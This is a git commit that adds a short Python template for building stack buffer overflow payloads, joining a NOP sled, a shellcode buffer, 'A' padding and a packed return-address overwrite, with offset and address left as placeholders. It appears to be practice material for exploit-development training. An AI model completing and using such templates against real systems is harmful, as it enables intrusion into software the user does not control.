717a4ffce372d1056b7556fff221f061aba2d341
7RU7H <100765038+7RU7H@users.noreply.github.com>
2022-03-05 09:51:56 +0000

    Add files via upload

---
+++ python3/bofTemplate.py
@@ -0,0 +1,17 @@
+from struct import pack
+
+nop = '\x90'
+
+buf =  b""
+# buf += ""
+
+offset = #
+payloadSize = offset + #8
+rip = #0xinstuction-pointer
+nopSled = 0* nop # amount of nops
+bufSize = len(buf)
+nopSize = len(nopSled)
+padding = 'A' * (payloadSize - bufSize - nopSize)
+payload = nopSled + buf + padding + pack("<Q", rip)
+
+print(payload)
